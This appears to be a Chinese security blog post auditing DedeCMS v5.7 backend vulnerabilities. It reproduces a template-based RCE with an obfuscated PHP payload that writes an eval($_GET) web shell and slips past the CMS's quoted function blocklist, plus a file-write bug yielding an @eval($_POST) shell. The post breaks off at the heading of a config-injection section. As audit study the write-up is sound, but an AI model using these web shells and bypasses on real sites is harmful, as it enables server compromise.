@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>代码审计-DedeCMS v5.7 - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dedecms-v5.7/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="代码审计-DedeCMS v5.7">
+  <meta property="og:description" content="环境搭建 这里下的源码 http://m.dedemao.com/view/2417某些版本有坑，后台登录为空，没有成功解决
+这个版本可以
+后台RCE 漏洞影响版本： &lt;=DedeCMS v5.7.105
+漏洞复现 登录后台 新建模板
+&lt;?php &#34;\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73&#34;(&#39;./shell.php&#39;, &#34;&lt;?php eva&#34; . &#34;l&#34; . &#34;(&#34; . &#34;$&#34; . &#34;_GE&#34; . &#34;T[1]);&#34;); 其实就是 file_put_contents(&#39;./shell.php&#39;, &#34;&lt;?php eval($_GET[1]);&#34;); ，为了绕waf
+把这个内容新建到1.htm 模板里
+然后新建页面，模板就引用1.htm ，新建文件用php后缀，这里会把htm文件里的内容写入到新建的php文件里
+成功后我们就得到了一个1.php文件，去访问一下，就可以执行代码 写入shell.php文件
+http://localhost:884/a/1.php 这里注意php的版本啊，刚开始用的5.6会报错，7以上应该可以
+至此我们任意文件写入 就达到了
+漏洞分析 可以看到新建模板的href 是tpl.php
+模板创建 并没有严格check内容 模板结尾必须是.htm，一些表单标签的关键字进行了替换
+更前面的版本是没有过滤的，比如我这个，可以直接创建一个shell文件
+&lt;=DedeCMS v5.7.105 会有过滤, 通过上面的绕过方法也能绕过了
+/* (/\*)[\s\S]*(\*/)#i 是一个正则表达式模式，表示要匹配的内容。 其中，/\*和 \*/表示分别匹配开头的 &#34;/&#34; 和结尾的 &#34;/&#34; 符号，[\s\S]* 表示匹配任意空白字符或非空白字符，i 表示忽略大小写。 这个正则表达式的作用是查找 $content 变量中所有以 &#34;/&#34; 开头、以 &#34;/&#34; 结尾的注释，并将其替换为空字符串。这样可以从文本中删除所有的注释内容。 */ $content = preg_replace(&#34;#(/\*)[\s\S]*(\*/)#i&#34;, &#39;&#39;, $content); // 黑名单正则匹配，禁了下面这些函数 global $cfg_disable_funs; $cfg_disable_funs = isset($cfg_disable_funs) ?">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T22:52:36+08:00">
+    <meta property="article:modified_time" content="2024-08-20T22:52:36+08:00">
+    <meta property="article:tag" content="Php">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="代码审计-DedeCMS v5.7">
+  <meta name="twitter:description" content="环境搭建 这里下的源码 http://m.dedemao.com/view/2417某些版本有坑，后台登录为空，没有成功解决
+这个版本可以
+后台RCE 漏洞影响版本： &lt;=DedeCMS v5.7.105
+漏洞复现 登录后台 新建模板
+&lt;?php &#34;\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73&#34;(&#39;./shell.php&#39;, &#34;&lt;?php eva&#34; . &#34;l&#34; . &#34;(&#34; . &#34;$&#34; . &#34;_GE&#34; . &#34;T[1]);&#34;); 其实就是 file_put_contents(&#39;./shell.php&#39;, &#34;&lt;?php eval($_GET[1]);&#34;); ，为了绕waf
+把这个内容新建到1.htm 模板里
+然后新建页面，模板就引用1.htm ，新建文件用php后缀，这里会把htm文件里的内容写入到新建的php文件里
+成功后我们就得到了一个1.php文件，去访问一下，就可以执行代码 写入shell.php文件
+http://localhost:884/a/1.php 这里注意php的版本啊，刚开始用的5.6会报错，7以上应该可以
+至此我们任意文件写入 就达到了
+漏洞分析 可以看到新建模板的href 是tpl.php
+模板创建 并没有严格check内容 模板结尾必须是.htm，一些表单标签的关键字进行了替换
+更前面的版本是没有过滤的，比如我这个，可以直接创建一个shell文件
+&lt;=DedeCMS v5.7.105 会有过滤, 通过上面的绕过方法也能绕过了
+/* (/\*)[\s\S]*(\*/)#i 是一个正则表达式模式，表示要匹配的内容。 其中，/\*和 \*/表示分别匹配开头的 &#34;/&#34; 和结尾的 &#34;/&#34; 符号，[\s\S]* 表示匹配任意空白字符或非空白字符，i 表示忽略大小写。 这个正则表达式的作用是查找 $content 变量中所有以 &#34;/&#34; 开头、以 &#34;/&#34; 结尾的注释，并将其替换为空字符串。这样可以从文本中删除所有的注释内容。 */ $content = preg_replace(&#34;#(/\*)[\s\S]*(\*/)#i&#34;, &#39;&#39;, $content); // 黑名单正则匹配，禁了下面这些函数 global $cfg_disable_funs; $cfg_disable_funs = isset($cfg_disable_funs) ?">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dedecms-v5.7/" /><link rel="prev" href="https://thnpkm.github.io/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E7%86%8A%E6%B5%B7cms_v1.0/" /><link rel="next" href="https://thnpkm.github.io/posts/web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/burpsuite%E9%9D%B6%E5%9C%BA%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "代码审计-DedeCMS v5.7",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/dedecms-v5.7\/"
+        },"genre": "posts","keywords": "php","wordcount":  276 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/dedecms-v5.7\/","datePublished": "2024-08-20T22:52:36+08:00","dateModified": "2024-08-20T22:52:36+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">代码审计-DedeCMS v5.7</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>代码审计</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;276 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#环境搭建">环境搭建</a></li>
+    <li><a href="#后台rce">后台RCE</a>
+      <ul>
+        <li><a href="#漏洞复现">漏洞复现</a></li>
+        <li><a href="#漏洞分析">漏洞分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#文件写入">文件写入</a>
+      <ul>
+        <li><a href="#漏洞分析-1">漏洞分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#配置文件注入">配置文件注入</a>
+      <ul>
+        <li><a href="#漏洞分析-2">漏洞分析</a></li>
+        <li><a href="#漏洞复现-1">漏洞复现</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="环境搭建">环境搭建</h2>
+<p>这里下的源码 <a href="http://m.dedemao.com/view/2417" target="_blank" rel="noopener noreffer">http://m.dedemao.com/view/2417</a>
+</p>
+<p>某些版本有坑，后台登录为空，没有成功解决</p>
+<p>这个版本可以</p>
+<h2 id="后台rce">后台RCE</h2>
+<p>漏洞影响版本： &lt;=DedeCMS v5.7.105</p>
+<h3 id="漏洞复现">漏洞复现</h3>
+<p>登录后台 新建模板</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011334511.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011334511.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011334511.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011334511.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011334511.png"
+        title="image-20230801133444392" /></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73</span><span style="color:#e6db74">&#34;</span>(<span style="color:#e6db74">&#39;./shell.php&#39;</span>, <span style="color:#e6db74">&#34;&lt;?php eva&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;l&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;(&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;$&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;_GE&#34;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;T[1]);&#34;</span>);
+</span></span></code></pre></div><p>其实就是 <code>file_put_contents('./shell.php', &quot;&lt;?php eval($_GET[1]);&quot;);</code>  ，为了绕waf</p>
+<p>把这个内容新建到1.htm 模板里</p>
+<p>然后新建页面，模板就引用1.htm ，新建文件用php后缀，这里会把htm文件里的内容写入到新建的php文件里</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011358899.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011358899.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011358899.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011358899.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011358899.png"
+        title="image-20230801135859830" /></p>
+<p>成功后我们就得到了一个1.php文件，去访问一下，就可以执行代码 写入shell.php文件</p>
+<pre tabindex="0"><code>http://localhost:884/a/1.php
+</code></pre><p>这里注意php的版本啊，刚开始用的5.6会报错，7以上应该可以</p>
+<!-- raw HTML omitted -->
+<p>至此我们任意文件写入 就达到了</p>
+<h3 id="漏洞分析">漏洞分析</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011424819.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011424819.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011424819.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011424819.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011424819.png"
+        title="image-20230801142438791" /></p>
+<p>可以看到新建模板的href 是tpl.php</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011523472.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011523472.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011523472.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011523472.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308011523472.png"
+        title="image-20230801152310435" /></p>
+<p>模板创建 并没有严格check内容  模板结尾必须是<code>.htm</code>，一些表单标签的关键字进行了替换</p>
+<!-- raw HTML omitted -->
+<p>更前面的版本是没有过滤的，比如我这个，可以直接创建一个shell文件</p>
+<p>&lt;=DedeCMS v5.7.105 会有过滤, 通过上面的绕过方法也能绕过了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> (/\*)[\s\S]*(\*/</span>)<span style="color:#75715e">#i 是一个正则表达式模式，表示要匹配的内容。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#a6e22e">其中，</span><span style="color:#f92672">/</span><span style="color:#a6e22e">\</span><span style="color:#f92672">*</span><span style="color:#a6e22e">和</span> <span style="color:#a6e22e">\</span><span style="color:#f92672">*/</span><span style="color:#a6e22e">表示分别匹配开头的</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#a6e22e">和结尾的</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#a6e22e">符号，</span>[<span style="color:#a6e22e">\s\S</span>]<span style="color:#f92672">*</span> <span style="color:#a6e22e">表示匹配任意空白字符或非空白字符，i</span> <span style="color:#a6e22e">表示忽略大小写。</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">这个正则表达式的作用是查找</span> $content <span style="color:#a6e22e">变量中所有以</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#a6e22e">开头、以</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#a6e22e">结尾的注释，并将其替换为空字符串。这样可以从文本中删除所有的注释内容。</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">*/</span>
+</span></span><span style="display:flex;"><span>$content <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;#(/\*)[\s\S]*(\*/)#i&#34;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $content);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 黑名单正则匹配，禁了下面这些函数
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">global</span> $cfg_disable_funs;
+</span></span><span style="display:flex;"><span>$cfg_disable_funs <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($cfg_disable_funs) <span style="color:#f92672">?</span> $cfg_disable_funs <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite,preg_replace&#39;</span>;
+</span></span><span style="display:flex;"><span>$cfg_disable_funs <span style="color:#f92672">=</span> $cfg_disable_funs<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> (<span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;,&#34;</span>, $cfg_disable_funs) <span style="color:#66d9ef">as</span> $value) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//将 `$value` 变量中的所有空格字符（包括空格、制表符和换行符等）都删除。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    $value <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, $value);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($value) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;#[^a-z]+[&#39;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">]*</span><span style="color:#e6db74">{</span>$value<span style="color:#e6db74">}</span><span style="color:#e6db74">[&#39;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">]*[\s]*[([{]#i&#34;</span>, <span style="color:#e6db74">&#34; </span><span style="color:#e6db74">{</span>$content<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">TRUE</span>) {
+</span></span><span style="display:flex;"><span>        $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">dede_htmlspecialchars</span>($content);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;</span><span style="color:#e6db74">{</span>$content<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/pre&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    如果 $content 的开头部分包含 &#34;&lt;?&#34;、&#34;&lt;?php&#34; 或 &#34;&lt;?=&#34; 等 PHP 代码标识符，并且标识符后跟着一个或多个空白字符，则条件成立。即就是匹配php代码的头
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;#^[\s\S]+&lt;\?(php|=)?[\s]+#i&#34;</span>, <span style="color:#e6db74">&#34; </span><span style="color:#e6db74">{</span>$content<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">TRUE</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//这里的U为惰性匹配 匹配函数变量执行，例如$a=&#34;phpinfo&#34;，则$a()就会被匹配
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU&#34;</span>, <span style="color:#e6db74">&#34; </span><span style="color:#e6db74">{</span>$content<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">TRUE</span>) {
+</span></span><span style="display:flex;"><span>        $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">dede_htmlspecialchars</span>($content);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;</span><span style="color:#e6db74">{</span>$content<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/pre&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 就是在上一个匹配前加了一个@，防止报错
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU&#34;</span>, <span style="color:#e6db74">&#34; </span><span style="color:#e6db74">{</span>$content<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">TRUE</span>) {
+</span></span><span style="display:flex;"><span>        $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">dede_htmlspecialchars</span>($content);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;</span><span style="color:#e6db74">{</span>$content<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/pre&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 匹配反引号`，防止命令执行
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;#[`][\s\S]*[`]#i&#34;</span>, <span style="color:#e6db74">&#34; </span><span style="color:#e6db74">{</span>$content<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">TRUE</span>) {
+</span></span><span style="display:flex;"><span>        $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">dede_htmlspecialchars</span>($content);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;</span><span style="color:#e6db74">{</span>$content<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/pre&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>     }
+</span></span></code></pre></div><p>这里是关于模板创建</p>
+<p>然后关于网页创建</p>
+<!-- raw HTML omitted -->
+<p>这里增加页面用的是templets_one_add.php</p>
+<!-- raw HTML omitted -->
+<p>跟进这个SaveToHtml()  将当前对象的内容保存为HTML文件</p>
+<!-- raw HTML omitted -->
+<p>跟进SaveTo()  将替换后的字符串保存到指定的文件中，即获取文件内容</p>
+<!-- raw HTML omitted -->
+<p>跟进 GetResult()</p>
+<!-- raw HTML omitted -->
+<p>调用<code>AssignSysTag()</code>方法进行标签的分配 ，即将一个字符串中的特定标签替换为对应的值，然后返回替换后的字符串。</p>
+<p>这个漏洞的成因简单来说，就是没有对用户新建的文件的名字是否合法做出判断，而且对文件内容的过滤也不完全，所以导致用户可以通过恶意输入进行利用。</p>
+<h2 id="文件写入">文件写入</h2>
+<p>DeDeCMS&lt;5.7.108</p>
+<p>也是需要登录 后台</p>
+<h3 id="漏洞分析-1">漏洞分析</h3>
+<p>通过危险函数回溯</p>
+<p><code>uploads/dede/article_template_rand.php</code> 文件下有个 <code>fwrite()</code></p>
+<p>$fp打开的是 <code>/template.rand.php</code> ,第二个变量$templates为可控变量</p>
+<!-- raw HTML omitted -->
+<p>访问 /dede/article_template_rand.php</p>
+<p>修改 发现成功保存，因为更早一点的版本也是毫无check的 ，后面的版本check的不严 也能绕过，最新版已经修复这个漏洞</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308012142585.png"
+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308012142585.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308012142585.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308012142585.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202308012142585.png"
+        title="image-20230801214244704" /></p>
+<p>访问 /data//template.rand.php ， 现在就是</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($_POST[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><!-- raw HTML omitted -->
+<h2 id="配置文件注入">配置文件注入</h2>
+<h3 id="漏洞分析-2">漏洞分析</h3>
